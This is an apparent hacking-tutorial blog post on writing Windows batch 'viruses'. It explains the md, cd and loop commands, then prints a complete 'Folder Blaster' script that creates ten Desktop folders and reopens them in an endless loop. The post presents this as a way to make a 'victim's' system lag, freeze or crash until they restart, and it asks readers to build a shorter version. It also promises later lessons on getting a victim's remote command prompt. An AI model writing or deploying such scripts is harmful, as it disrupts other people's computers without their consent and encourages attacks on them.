---
title: Folder blaster, The more annoying the better
path: /folder-blaster
tags:
  - Cyber Security
metaImage: assets/folder-blaster.jpeg
featuredImage: ./assets/folder-blaster.jpeg
excerpt: The commands we use to make batch files are actually the same commands
  first implemented in MS-DOS (An ancient microsoft OS). These DOS(Disk
  Operating System) commands can also be used in the command prompt window.
  Whatever your batch file does, you can do it through the command line
  interface (CLI).
created: 2020-06-14T13:55:57.348Z
updated: 2020-06-14T13:55:57.420Z
---
The commands we use to make batch files are actually the same commands first implemented in MS-DOS (An ancient microsoft OS). These DOS(Disk Operating System) commands can also be used in the command prompt window. Whatever your batch file does, you can do it through the command line interface (CLI).

Start “Run”, or hit \[Windows key + R]. Type “cmd”, and you’re presented with the CLI. You can type “help” to get a list of commonly used commands and their functions. I recommend you try out each and every single command you can find. Hacking is getting more and more user friendly everyday, CLIs are being replaced by GUIs (Graphical User Interfaces) - meaning in most places you won’t have to actually type in the commands, you can just select an option and press a button. But as of now, this is a work in progress. With more advanced hacking techniques, specially the ones that involve using BackTrack tools, you will find that majority of the hacks are still done through the CLI (More on this, later).

You will soon be learning how to hack into a remote computer and get the CMD window of the victim’s computer. Hence, I recommend getting used to the CLI, as soon as possible, as much as possible. Before getting to the code, let’s take a look at a couple of commands.

md - (or mkdir) - Make Directory. This command is used to create a directory (a folder). The command:

`md abcd`

..will create a folder in the current directory named “abcd”.

cd - Change Directory. This command is used to change the current directory. The following command:

`cd C:\`

..will take the program (your batch file) to the Root folder and:

`cd C:\Users`

..will take you to the folder called Users in the C drive. You can change where you “mkdir” by using “cd”. (You can now create folders in any directory you like)

Here we’ve got the Folder Blaster virus. Again, this one’s fairly easy to understand. What we’re doing below is creating a bunch of folders, opening them all at once and keeping them open, effectively hogging a big portion of the screen and memory causing the windows to lag, freeze up and sometimes crash.

```shell
@echo off
cd ./Desktop
md 1
md 2
md 3
md 4
md 5
md 6
md 7
md 8
md 9
md 0
:checkpoint
start 1
start 2
start 3
start 4
start 5
start 6
start 7
start 8
start 9
start 0
goto checkpoint
```

So, we begin by turning off echo. Then we change the directory to Desktop. Now we create ten folders with names 0-9. We setup a label and start opening up all the 10 folders. Now the final statement causes an infinite loop. Of course, if the folder is already opened it will not be opened again. But the use of this infinite loop is if the user attempts to close the folder, the loop is still going on and it will send a message to open that folder again. So the victim will be stuck as every time s/he closes a folder it opens up again, eventually making them give up and restart the system.The above code can be made much shorter with the use of LOOPs, as discussed below. We start by creating a variable and setting it’s value to 0. We use this variable as a check to let the computer know when to come out of the loop. Take a look at the code first:

```shell
@echo off
set /a i=0
:loop
if %i%==10 goto end
echo This is iteration %i%.
set /a i=%i%+1
goto loop
:end
```

“set” is used to define and initialize a variable. Here we create a variable called “i” and set it’s value to zero. After setting up a label, we check if the value of the variable “i” (given by %i%) is equal to 10, and if it is we “goto” the label end (the program ends when this happens). Now we “echo” (send a message) to notify the user which iteration is currently running. In the next step we increment the value of “i” by one and then go back to the “if” statement.

So the loop runs ten times (0-9), and then stops. The above was not a virus, but a simple program. Earlier, I told you that the above Folder Blaster virus code can be made shorter by using loops. You know how to make the virus, and now you know how to use loops. Combining the two of them, I leave as an exercise for the wannabe hacker. (HINT: See the folder names up top going from 0-9 ? You can just replace them with %i% in the above loop.)

- - -

Next up, we’re going to equip you with the tools you need to be able to start creating your own viruses. Let’s head over there and [learn a bit more about batch file viruses](https://blog.leewardslope.com/frequently-asked-questions-about-batch-files).